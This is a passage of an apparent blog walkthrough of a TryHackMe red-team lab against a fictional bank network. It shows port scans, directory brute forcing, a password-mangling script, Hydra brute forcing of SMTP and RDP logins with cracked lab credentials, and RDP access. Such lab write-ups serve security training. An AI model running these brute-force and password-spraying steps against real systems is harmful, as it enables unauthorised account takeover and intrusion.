Host is up <span class="o">(</span>0.057s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
1194/tcp open openvpn
<span class="c"># Nmap done at Sat May 13 14:30:05 2023 -- 1 IP address (1 host up) scanned in 11.71 </span>
</pre></table></code></div></div><h4 id="the-web-page-1"><strong>The Web Page</strong></h4><p>A normal login page, but if we got any creds we will get access to the Internal Network. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%205.png" alt="Untitled" /></p><h4 id="directory-brute-forcing-1"><strong>Directory Brute forcing</strong></h4><p>Looking for any hidden directories:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[/opt/dirsearch]
└─<span class="nv">$ </span>python3 dirsearch.py <span class="nt">-u</span> http://10.200.x.12/ <span class="nt">--random-agent</span>

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                    
 <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>                                                                                             

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11590

Output: /opt/dirsearch/reports/http_10.200.x.12/__24-05-19_15-48-16.txt

Target: http://10.200.x.12/

<span class="o">[</span>15:48:16] Starting:                                                                                                                                            
<span class="o">[</span>15:50:24] 200 -    5B  - /login.php                                        
<span class="o">[</span>15:50:26] 302 -    0B  - /logout.php  -&gt;  index.php                                                         
<span class="o">[</span>15:51:25] 302 -    0B  - /upload.php  -&gt;  index.php                        
<span class="o">[</span>15:51:30] 200 -  462B  - /vpn/  
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">/vpn/</code> directory only contains an <code class="language-plaintext highlighter-rouge">.ovpn</code> open VPN config file. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/ef9e13af-12ae-4595-897c-0bd7f1ac21e8.png" alt="Untitled" /></p><p>hmm! What could this ovpn file give us access to? Let’s try to connect and see.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC]
└─<span class="nv">$ </span>openvpn corpUsername.ovpn

┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC]
└─<span class="nv">$ </span>ifconfig tun1     
tun1: <span class="nv">flags</span><span class="o">=</span>4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500
        inet 12.100.1.x  netmask 255.255.255.0  destination 12.100.1.x
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  <span class="o">(</span>UNSPEC<span class="o">)</span>
        RX packets 1  bytes 48 <span class="o">(</span>48.0 B<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 <span class="o">(</span>0.0 B<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</pre></table></code></div></div><p>We have been assigned a new IP, let’s scan this subnet with Nmap.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC]
└─<span class="nv">$ </span>nmap <span class="nt">-sP</span> 12.100.1.0/24
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-20 13:30 EET
Nmap scan report <span class="k">for </span>1.mubc.chcg.chcgil24.dsl.att.net <span class="o">(</span>12.100.1.1<span class="o">)</span>
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>9.mubc.chcg.chcgil24.dsl.att.net <span class="o">(</span>12.100.1.x<span class="o">)</span>
Host is up.
Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>2 hosts up<span class="o">)</span> scanned <span class="k">in </span>14.68 seconds
</pre></table></code></div></div><p>It seems that no other host is alive on this network. One Sec! Here, I have only scanned the subnet <strong><code class="language-plaintext highlighter-rouge">12.100.1.0/24</code></strong> but maybe this VPN will give us access to other machines on the network in a different subnet or range. Let’s see the route.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC]
└─<span class="nv">$ </span>route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
10.50.110.0     0.0.0.0         255.255.255.0   U     0      0        0 tun0
10.200.x.0    10.50.110.1     255.255.255.0   UG    1000   0        0 tun0
10.200.x.21   1.mubc.chcg.chc 255.255.255.255 UGH   1000   0        0 tun1
10.200.x.22   1.mubc.chcg.chc 255.255.255.255 UGH   1000   0        0 tun1
12.100.1.0      0.0.0.0         255.255.255.0   U     0      0        0 tun1

</pre></table></code></div></div><p>Who are those <strong>10.200.x.21/22</strong> ?? Let’s put them aside for now and resume our enumeration phase on the MAIL machine.</p><h3 id="mail-machine"><strong>Mail Machine</strong></h3><h4 id="nmap-2"><strong>Nmap</strong></h4><p>Doing Nmap, to check if there are any vulnerable services:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.93 scan initiated Sat May 13 12:22:57 2023 as: nmap -p- --min-rate 5000 -oN</span>
scans/nmap_alltcp 10.200.103.11
Nmap scan report <span class="k">for </span>10.200.103.11
Host is up <span class="o">(</span>0.053s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65513 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT STATE SERVICE
22/tcp open ssh
25/tcp open smtp
80/tcp open http
110/tcp open pop3
135/tcp open msrpc
139/tcp open netbios-ssn
143/tcp open imap
445/tcp open microsoft-ds
587/tcp open submission
3306/tcp open mysql
3389/tcp open ms-wbt-server
5985/tcp open wsman
33060/tcp open mysqlx
47001/tcp open winrm
49664/tcp open unknown
49665/tcp open unknown
49666/tcp open unknown
49667/tcp open unknown
49668/tcp open unknown
49669/tcp open unknown
49670/tcp open unknown
49682/tcp open unknown

┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC]
└─<span class="nv">$ </span>nmap <span class="nt">-p22</span>,25,80,110,135,139,143,445,587,3306,3389,5985,33060,47001,49664,49665,49666,49667,49668,49669,49670,49682 10.200.x.11 <span class="nt">-A</span>
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-05-20 15:36 EET
Stats: 0:00:37 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Service Scan
Service scan Timing: About 61.90% <span class="k">done</span><span class="p">;</span> ETC: 15:37 <span class="o">(</span>0:00:22 remaining<span class="o">)</span>
Stats: 0:00:39 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Service Scan
Service scan Timing: About 61.90% <span class="k">done</span><span class="p">;</span> ETC: 15:37 <span class="o">(</span>0:00:23 remaining<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.200.x.11
Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE  SERVICE       VERSION
22/tcp    open   ssh           OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 f36c52d27fe90e1cc1c7ac962cd1ec2d <span class="o">(</span>RSA<span class="o">)</span>
|   256 c2563cedc4b069a8e7ad3c310505e985 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 d3e5f07375d520d9c0bb4199e7afa000 <span class="o">(</span>ED25519<span class="o">)</span>
25/tcp    open   smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open   http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
110/tcp   open   pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open   imap          hMailServer imapd
|_imap-capabilities: ACL completed IMAP4 CAPABILITY NAMESPACE CHILDREN OK <span class="nv">RIGHTS</span><span class="o">=</span>texkA0001 SORT QUOTA IMAP4rev1 IDLE
445/tcp   open   microsoft-ds?
587/tcp   open   smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp  open   mysql         MySQL 8.0.31
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.31
|   Thread ID: 38
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, FoundRows, SupportsTransactions, IgnoreSigpipes, LongColumnFlag, Speaks41ProtocolNew, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, LongPassword, InteractiveClient, ODBCClient, ConnectWithDatabase, SupportsCompression, IgnoreSpaceBeforeParenthesis, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: &lt;     6<span class="se">\x</span>10:?DoI<span class="se">\x</span><span class="nv">1B</span><span class="o">=</span>eB<span class="se">\x</span>04wK<span class="k">*</span>DHs
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>MySQL_Server_8.0.31_Auto_Generated_Server_Certificate
| Not valid before: 2023-01-10T07:46:11
|_Not valid after:  2033-01-07T07:46:11
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>MAIL.thereserve.loc
| Not valid before: 2024-05-18T10:42:27
|_Not valid after:  2024-11-17T10:42:27
|_ssl-date: 2024-05-20T13:38:04+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THERESERVE
|   NetBIOS_Domain_Name: THERESERVE
|   NetBIOS_Computer_Name: MAIL
|   DNS_Domain_Name: thereserve.loc
|   DNS_Computer_Name: MAIL.thereserve.loc
|   DNS_Tree_Name: thereserve.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-20T13:37:55+00:00
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
33060/tcp open   mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message<span class="s2">"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"</span>
|_    HY000
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0

</pre></table></code></div></div><h4 id="the-web-page-2"><strong>The Web Page</strong></h4><p>Hmmm, Port 80 seems empty: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%206.png" alt="Untitled" /></p><h4 id="directory-brute-forcing-2"><strong>Directory Brute forcing</strong></h4><p>It seems nothing there!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.200.x.11//october/index.php/FUZZ

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.200.x.11//october/index.php/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

:: Progress: [220560/220560] :: Job [1/1] :: 315 req/sec :: Duration: [0:12:54] :: Errors: 0 ::
</span></pre></table></code></div></div><h4 id="accessing-our-mailbox"><strong>Accessing Our MailBox</strong></h4><p>As the SSH Server instructions suggest, it gave us creds for an email, so let’s download any mail service like <strong>thunderbird</strong> to get access to our inbox.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">tar </span>xjf thunderbird-<span class="k">*</span>.tar.bz2 
<span class="nv">$ </span><span class="nb">rm </span>thunderbird-<span class="k">*</span>.tar.bz2
<span class="nv">$ </span><span class="nb">mv </span>thunderbird /opt
<span class="nv">$ </span><span class="nb">sudo ln</span> <span class="nt">-s</span> /opt/thunderbird/thunderbird /usr/local/bin/thunderbird
</pre></table></code></div></div><p>Then run the <strong>thunderbird</strong> app and click on Set Up an Existing Email. Adding the password that we received earlier and connecting.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%207.png" alt="Untitled" /></p><p>Once connected, we will find the following message: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%208.png" alt="Untitled" /></p><p>I have tried to send emails to others members to see If I could phish other users and get access, but it gives me the following error: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%209.png" alt="Untitled" /></p><h4 id="password-mangling"><strong>Password Mangling</strong></h4><p>It seems that we are running out of options. The last thing that I can think of is brute forcing. At the beginning of the challenge, we have been provided with <code class="language-plaintext highlighter-rouge">password_base_list.txt</code> that contains some sample passwords:</p><pre><code class="language-txt">TheReserve
thereserve
Reserve
reserve
CorpTheReserve
corpthereserve
Password
password
TheReserveBank
thereservebank
ReserveBank
reservebank
</code></pre><p>And the following instructions are in the <code class="language-plaintext highlighter-rouge">password_policy.txt</code> file:</p><pre><code class="language-txt">The password policy for TheReserve is the following:
* At least 8 characters long
* At least 1 number
* At least 1 special character 
* special character !@#$%^
</code></pre><p>So we could expand our wordlist using the mangling technique.</p><h4 id="mangler-script"><strong>Mangler Script</strong></h4><p>With the help of ChatGPT “he” has created the following script:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">itertools</span>

<span class="c1"># Read the base wordlist
</span><span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">password_base_list.txt</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">base_words</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">().</span><span class="nf">splitlines</span><span class="p">()</span>

<span class="c1"># Define the numbers and special characters
</span><span class="n">numbers</span> <span class="o">=</span> <span class="sh">'</span><span class="s">0123456789</span><span class="sh">'</span>
<span class="n">special_chars</span> <span class="o">=</span> <span class="sh">'</span><span class="s">!@#$%^</span><span class="sh">'</span>

<span class="c1"># Function to generate mangled passwords
</span><span class="k">def</span> <span class="nf">generate_mangled_passwords</span><span class="p">(</span><span class="n">word</span><span class="p">):</span>
    <span class="n">mangled_passwords</span> <span class="o">=</span> <span class="nf">set</span><span class="p">()</span>

    <span class="c1"># Append numbers and special characters
</span>    <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="n">numbers</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">special_chars</span><span class="p">:</span>
            <span class="c1"># Add the number and special character at different positions
</span>            <span class="n">mangled_passwords</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">word</span> <span class="o">+</span> <span class="n">num</span> <span class="o">+</span> <span class="n">char</span><span class="p">)</span>
            <span class="n">mangled_passwords</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">word</span> <span class="o">+</span> <span class="n">char</span> <span class="o">+</span> <span class="n">num</span><span class="p">)</span>

    <span class="c1"># Ensure all generated passwords are at least 8 characters long
</span>    <span class="n">mangled_passwords</span> <span class="o">=</span> <span class="p">{</span><span class="n">pwd</span> <span class="k">for</span> <span class="n">pwd</span> <span class="ow">in</span> <span class="n">mangled_passwords</span> <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">8</span><span class="p">}</span>
    
    <span class="k">return</span> <span class="n">mangled_passwords</span>
    
<span class="c1"># Generate passwords and write to file
</span><span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">'</span><span class="s">generated_passwords.txt2</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">base_words</span><span class="p">:</span>
        <span class="n">mangled_passwords</span> <span class="o">=</span> <span class="nf">generate_mangled_passwords</span><span class="p">(</span><span class="n">word</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">pwd</span> <span class="ow">in</span> <span class="n">mangled_passwords</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">pwd</span> <span class="o">+</span> <span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
</pre></table></code></div></div><p>Running the script will expand our wordlist with, 1440 new passwords. We have multiple choices for using this wordlist as we have <strong><em>( The Admin Panel for October CMS - The VPN Portal -  SSH Services and others - SMTP Mail Server )</em></strong></p><h4 id="brute-forcing-the-mail-server"><strong>Brute forcing the Mail Server</strong></h4><p>We have already collected some info about the team working for the Reserve company and already know the email format that is being used. Let’s create our email wordlist and start the attack.</p><pre><code class="language-txt">aimee.walker@corp.thereserve.loc
patrick.edwards@corp.thereserve.loc
Brenda.henderson@corp.thereserve.loc
leslie.morley@corp.thereserve.loc
martin.savage@corp.thereserve.loc
paula.bailey@corp.thereserve.loc
hristopher.smith@corp.thereserve.loc
antony.ross@corp.thereserve.loc
charlene.thomas@corp.thereserve.loc
rhys.parsons@corp.thereserve.loc
lynda.gordon@corp.thereserve.loc
roy.sims@corp.thereserve.loc
laura.wood@corp.thereserve.loc
emily.harvey@corp.thereserve.loc
ashley.chan@corp.thereserve.loc
keith.allen@corp.thereserve.loc
mohammad.ahmed@corp.thereserve.loc
applications@corp.thereserve.loc
</code></pre><p>I will be using Hydra tool for this attack.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$ </span>hydra <span class="nt">-L</span> ../emails.txt <span class="nt">-P</span> generated_passwords2.txt 10.200.x.11 smtp 
Hydra v9.4 <span class="o">(</span>c<span class="o">)</span> 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>

Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2024-05-21 14:31:13
<span class="o">[</span>INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
<span class="o">[</span>DATA] max 16 tasks per 1 server, overall 16 tasks, 25920 login tries <span class="o">(</span>l:18/p:1440<span class="o">)</span>, ~1620 tries per task
<span class="o">[</span>DATA] attacking smtp://10.200.x.11:25/
<span class="o">[</span>STATUS] 1049.00 tries/min, 1049 tries <span class="k">in </span>00:01h, 24871 to <span class="k">do in </span>00:24h, 16 active
<span class="o">[</span>STATUS] 1016.00 tries/min, 3048 tries <span class="k">in </span>00:03h, 22872 to <span class="k">do in </span>00:23h, 16 active
<span class="o">[</span>STATUS] 1066.71 tries/min, 7467 tries <span class="k">in </span>00:07h, 18453 to <span class="k">do in </span>00:18h, 16 active
<span class="o">[</span>STATUS] 1056.83 tries/min, 12682 tries <span class="k">in </span>00:12h, 13238 to <span class="k">do in </span>00:13h, 16 active
<span class="o">[</span>STATUS] 1030.06 tries/min, 17511 tries <span class="k">in </span>00:17h, 8409 to <span class="k">do in </span>00:09h, 16 active
<span class="o">[</span>25][smtp] host: 10.200.x.11   login: laura.wood@corp.thereserve.loc   password: Password1
<span class="o">[</span>STATUS] 1045.00 tries/min, 22990 tries <span class="k">in </span>00:22h, 2930 to <span class="k">do in </span>00:03h, 16 active
<span class="o">[</span>25][smtp] host: 10.200.x.11   login: mohammad.ahmed@corp.thereserve.loc   password: Password1
1 of 1 target successfully completed, 2 valid passwords found
</pre></table></code></div></div><p>Yess!! We have a valid creds. I thought of accessing their mailbox might lead to sensitive information, but it is EMPTY:) <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2010.png" alt="Untitled" /></p><h4 id="password-spraying"><strong>Password Spraying</strong></h4><p>Hmm! Since there are no emails in their inbox, let’s try to spray those valid creds on the available services. I have tried those creds against the following:</p><ul><li><strong>10.200.x.11</strong> — MailBox - SSH - RDP<li><strong>10.200.x.12</strong> — SSH - VPN Portal Login<li><strong>10.200.x.13</strong> — SSH - October CMS Admin Panel<li><strong>10.200.x.21</strong> - RDP <strong><em>(Worked!)</em></strong><li><strong>10.200.x.22</strong> - RDP <strong><em>(Worked!)</em></strong></ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC]
└─<span class="nv">$ </span>hydra <span class="nt">-L</span> names.txt <span class="nt">-P</span> valid_passwords 10.200.x.21 rdp

<span class="o">[</span>3389][rdp] host: 10.200.x.21   login: mohammad.ahmed   password: Password1!

1 of 1 target successfully completed, 1 valid password found
                                                                                                             
┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~/THM/N-RedTeamCC]
└─<span class="nv">$ </span>hydra <span class="nt">-L</span> names.txt <span class="nt">-P</span> valid_passwords 10.200.x.22 rdp

<span class="o">[</span>3389][rdp] host: 10.200.x.22   login: laura.wood   password: Password1@
<span class="o">[</span>3389][rdp] host: 10.200.x.22   login: mohammad.ahmed   password: Password1!

1 of 1 target successfully completed, 2 valid passwords found
</pre></table></code></div></div><h2 id="foothold-on-the-corporate-division-tier-2-infrastructure"><strong>Foothold on The Corporate Division Tier 2 Infrastructure</strong></h2><p>let’s access them and see what is inside:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>xfreerdp /u:mohammad.ahmed /p:<span class="s1">'Password1!'</span> +clipboard /dynamic-resolution /cert:ignore /v:10.200.x.21 /drive:share,/opt/
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/N-RedTeamCC/Untitled%2011.png" alt="Untitled" /></p><p><strong>Submitting Flags</strong> Great as we now have access in the internal network let’s sumbit our first flags:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-[~]
└─<span class="nv">$ </span>ssh e-citizen@10.200.x.250
e-citizen@10.200.x.250<span class="s1">'s password: 

Welcome to the e-Citizen platform!
Please make a selection:
[1] Register
[2] Authenticate
[3] Exit
Selection:2
Please provide your username: ItsFadinG
Please provide your password: ******

Welcome ItsFadinG

What would you like to do?
Please select an option
[1] Submit proof of compromise
[2] Verify past compromises
[3] Verify email access
[4] Get hints
[5] Exit
Selection:1

Same Steps from 1-3 as we have got an active directory foothold
Please select which flag you would like to submit proof for:
[1]     Perimeter Breach
[2]     Active Directory Breach
[3]     CORP Tier 2 Foothold
[4]     CORP Tier 2 Admin
[5]     CORP Tier 1 Foothold
[6]     CORP Tier 1 Admin
[7]     CORP Tier 0 Foothold
[8]     CORP Tier 0 Admin
[9]     BANK Tier 2 Foothold
[10]    BANK Tier 2 Admin
[11]    BANK Tier 1 Foothold
[12]    BANK Tier 1 Admin
[13]    BANK Tier 0 Foothold
[14]    BANK Tier 0 Admin
[15]    ROOT Tier 0 Foothold
[16]    ROOT Tier 0 Admin
[17]    SWIFT Web Access
[18]    SWIFT Capturer Access
[19]    SWIFT Approver Access
[20]    SWIFT Payment Made
[100]   Exit
Selection:1
Please provide the hostname of the host you have compromised (please use the name provided in your network diagram): WRK2

In order to verify your access, please complete the following steps.
1. On the wrk2 host, navigate to the C:\Windows\Temp\ directory
2. Create a text file with this name: ItsFadinG.txt
3. Add the following UUID to the first line of the file: 00763558-2485-4d56-8afc-b5a6207bbe42
4. Click proceed for the verification to occur

Once you have performed the steps, please enter Y to verify your access.
If you wish to fully exit verification and try again please, please enter X.
If you wish to remove this verification attempt, please enter Z
Ready to verify? [Y/X/Z]: Y
Warning: Permanently added '</span>10.200.x.22<span class="s1">' (ECDSA) to the list of known hosts.
ItsFadinG.txt                                                                                                                                                                                           100%   41    36.2KB/s   00:00    

Well done! Check your email!
